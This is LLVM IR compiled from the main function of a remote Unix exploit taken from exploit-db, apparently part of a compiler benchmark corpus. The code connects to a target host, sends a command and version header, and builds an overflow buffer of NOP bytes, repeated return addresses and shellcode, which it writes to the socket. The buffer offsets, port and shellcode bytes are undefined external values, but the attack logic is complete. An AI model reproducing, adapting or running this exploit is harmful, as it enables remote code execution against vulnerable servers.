; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20163.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20163.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i32, i32 }
%struct.sockaddr = type { i32 }

@MAXBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [23 x i8] c"usage : %s TargetHost\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@TARGET_PORT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"Can not resolve specified host.\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"Can not connect to %s:%d\0A\00", align 1
@COMMAND = common dso_local global i32 0, align 4
@VERSION = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [20 x i8] c"Jumping Address=%x\0A\00", align 1
@RET = common dso_local global i32 0, align 4
@ADJUST = common dso_local global i32 0, align 4
@STR1_SIZE = common dso_local global i64 0, align 8
@shellcode = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [17 x i8] c"Connected to %d\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.in_addr, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* @MAXBUF, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %11, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %12, align 8
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 2
  br i1 %18, label %19, label %25

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0), i8* %22)
  %24 = call i32 @exit(i32 1) #4
  unreachable

25:                                               ; preds = %2
  %26 = load i32, i32* @AF_INET, align 4
  %27 = load i32, i32* @SOCK_STREAM, align 4
  %28 = call i32 @socket(i32 %26, i32 %27, i32 0)
  store i32 %28, i32* %6, align 4
  %29 = load i32, i32* @AF_INET, align 4
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i32 %29, i32* %30, align 4
  %31 = load i32, i32* @TARGET_PORT, align 4
  %32 = call i32 @htons(i32 %31)
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %32, i32* %33, align 4
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 1
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @inet_addr(i8* %36)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %39 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %38, i32 0, i32 0
  store i32 %37, i32* %39, align 4
  %40 = icmp eq i32 %37, -1
  br i1 %40, label %41, label %65

41:                                               ; preds = %25
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call %struct.hostent* @gethostbyname(i8* %44)
  store %struct.hostent* %45, %struct.hostent** %10, align 8
  %46 = icmp eq %struct.hostent* %45, null
  br i1 %46, label %47, label %50

47:                                               ; preds = %41
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  %49 = call i32 @exit(i32 1) #4
  unreachable

50:                                               ; preds = %41
  %51 = load %struct.hostent*, %struct.hostent** %10, align 8
  %52 = getelementptr inbounds %struct.hostent, %struct.hostent* %51, i32 0, i32 2
  %53 = load i32, i32* %52, align 4
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %56 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %55, i32 0, i32 0
  %57 = bitcast i32* %56 to i8*
  %58 = load %struct.hostent*, %struct.hostent** %10, align 8
  %59 = getelementptr inbounds %struct.hostent, %struct.hostent* %58, i32 0, i32 1
  %60 = load i32, i32* %59, align 4
  %61 = load %struct.hostent*, %struct.hostent** %10, align 8
  %62 = getelementptr inbounds %struct.hostent, %struct.hostent* %61, i32 0, i32 0
  %63 = load i32, i32* %62, align 4
  %64 = call i32 @memcpy(i8* %57, i32 %60, i32 %63)
  br label %65

65:                                               ; preds = %50, %25
  %66 = load i32, i32* %6, align 4
  %67 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %68 = call i64 @connect(i32 %66, %struct.sockaddr* %67, i32 12)
  %69 = icmp ne i64 %68, 0
  br i1 %69, label %70, label %77

70:                                               ; preds = %65
  %71 = load i8**, i8*** %5, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 1
  %73 = load i8*, i8** %72, align 8
  %74 = load i32, i32* @TARGET_PORT, align 4
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i8* %73, i32 %74)
  %76 = call i32 @exit(i32 1) #4
  unreachable

77:                                               ; preds = %65
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* @COMMAND, align 4
  %80 = call i32 @putint(i32 %78, i32 %79)
  %81 = load i32, i32* %6, align 4
  %82 = load i32, i32* @VERSION, align 4
  %83 = call i32 @putint(i32 %81, i32 %82)
  %84 = load i32, i32* @NOP, align 4
  %85 = load i32, i32* @MAXBUF, align 4
  %86 = call i32 @memset(i8* %16, i32 %84, i32 %85)
  %87 = load i32, i32* @RET, align 4
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0), i32 %87)
  %89 = load i32, i32* @ADJUST, align 4
  %90 = add nsw i32 100, %89
  store i32 %90, i32* %7, align 4
  br label %91

91:                                               ; preds = %128, %77
  %92 = load i32, i32* %7, align 4
  %93 = load i32, i32* @ADJUST, align 4
  %94 = add nsw i32 400, %93
  %95 = icmp slt i32 %92, %94
  br i1 %95, label %96, label %131

96:                                               ; preds = %91
  %97 = load i32, i32* @RET, align 4
  %98 = ashr i32 %97, 24
  %99 = and i32 %98, 255
  %100 = trunc i32 %99 to i8
  %101 = load i32, i32* %7, align 4
  %102 = add nsw i32 %101, 3
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %16, i64 %103
  store i8 %100, i8* %104, align 1
  %105 = load i32, i32* @RET, align 4
  %106 = ashr i32 %105, 16
  %107 = and i32 %106, 255
  %108 = trunc i32 %107 to i8
  %109 = load i32, i32* %7, align 4
  %110 = add nsw i32 %109, 2
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8, i8* %16, i64 %111
  store i8 %108, i8* %112, align 1
  %113 = load i32, i32* @RET, align 4
  %114 = ashr i32 %113, 8
  %115 = and i32 %114, 255
  %116 = trunc i32 %115 to i8
  %117 = load i32, i32* %7, align 4
  %118 = add nsw i32 %117, 1
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %16, i64 %119
  store i8 %116, i8* %120, align 1
  %121 = load i32, i32* @RET, align 4
  %122 = and i32 %121, 255
  %123 = trunc i32 %122 to i8
  %124 = load i32, i32* %7, align 4
  %125 = add nsw i32 %124, 0
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i8, i8* %16, i64 %126
  store i8 %123, i8* %127, align 1
  br label %128

128:                                              ; preds = %96
  %129 = load i32, i32* %7, align 4
  %130 = add nsw i32 %129, 4
  store i32 %130, i32* %7, align 4
  br label %91

131:                                              ; preds = %91
  %132 = load i64, i64* @STR1_SIZE, align 8
  %133 = getelementptr inbounds i8, i8* %16, i64 %132
  store i8 0, i8* %133, align 1
  %134 = load i32, i32* @MAXBUF, align 4
  %135 = sub nsw i32 %134, 1
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %16, i64 %136
  store i8 0, i8* %137, align 1
  %138 = getelementptr inbounds i8, i8* %16, i64 600
  %139 = load i32, i32* @ADJUST, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds i8, i8* %138, i64 %140
  %142 = load i32, i32* @shellcode, align 4
  %143 = load i32, i32* @shellcode, align 4
  %144 = call i32 @strlen(i32 %143)
  %145 = call i32 @memcpy(i8* %141, i32 %142, i32 %144)
  %146 = load i32, i32* %6, align 4
  %147 = load i32, i32* @MAXBUF, align 4
  %148 = call i32 @write(i32 %146, i8* %16, i32 %147)
  %149 = load i32, i32* @TARGET_PORT, align 4
  %150 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0), i32 %149)
  %151 = load i32, i32* %6, align 4
  %152 = call i32 @term(i32 %151, i32 0)
  %153 = load i8*, i8** %11, align 8
  call void @llvm.stackrestore(i8* %153)
  %154 = load i32, i32* %3, align 4
  ret i32 %154
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @putint(i32, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @term(i32, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
